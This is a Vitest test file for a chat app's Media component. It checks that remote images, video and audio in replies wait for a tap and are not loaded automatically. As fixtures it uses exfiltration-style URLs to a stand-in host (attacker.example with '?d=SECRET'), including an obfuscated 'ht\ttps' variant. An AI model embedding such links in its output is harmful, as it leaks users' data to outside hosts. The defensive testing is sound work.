// @vitest-environment happy-dom
// A remote image, video or audio in a reply waits for a tap in every chat, not only after a phone_data read.
import { act } from 'react'
import { createRoot } from 'react-dom/client'
import { beforeAll, describe, expect, test } from 'vitest'
import { Media } from './components/Media'

beforeAll(() => {
  ;(globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }).IS_REACT_ACT_ENVIRONMENT = true
})

async function draw(src: string) {
  const host = document.createElement('div')
  document.body.append(host)
  await act(async () => createRoot(host).render(<Media src={src} alt="x" />))
  return host
}

describe('Media in a chat that has read no phone data', () => {
  test('a remote image is not fetched until a tap', async () => {
    const host = await draw('https://attacker.example/p.png?d=SECRET')
    expect(host.querySelector('img')).toBeNull()
    const hold = host.querySelector('button.remote-hold') as HTMLButtonElement
    expect(hold.textContent).toContain('attacker.example')
    expect(hold.textContent).toContain('has data in the address')
    expect(hold.textContent).toContain('Tap to load')
    await act(async () => hold.click())
    expect(host.querySelector('button.remote-hold')).toBeNull()
    expect(host.querySelector('img')?.getAttribute('src')).toBe('https://attacker.example/p.png?d=SECRET')
  })

  test('http, protocol-relative and spaced-out addresses wait too', async () => {
    for (const src of ['http://attacker.example/p.gif', '//attacker.example/p.png', 'ht\ttps://attacker.example/p.png']) {
      const host = await draw(src)
      expect(host.querySelector('img'), src).toBeNull()
      expect(host.querySelector('.remote-hold'), src).not.toBeNull()
    }
  })

  test('a remote video or audio is held with "Tap to open"', async () => {
    for (const src of ['https://attacker.example/v.mp4', 'https://attacker.example/a.mp3']) {
      const host = await draw(src)
      expect(host.querySelector('video, audio, .audio-player'), src).toBeNull()
      expect(host.querySelector('.remote-hold')?.textContent, src).toContain('Tap to open')
    }
  })

  test('a data: image loads by itself, and a blob: address is not held', async () => {
    const data = 'data:image/png;base64,AAAA'
    const host = await draw(data)
    expect(host.querySelector('.remote-hold')).toBeNull()
    expect(host.querySelector('img')?.getAttribute('src')).toBe(data)
    // A blob: address has no file ending, so it shows as a file chip, not an image; what matters is that it is not held.
    expect((await draw('blob:https://app.example/1234')).querySelector('.remote-hold')).toBeNull()
  })
})
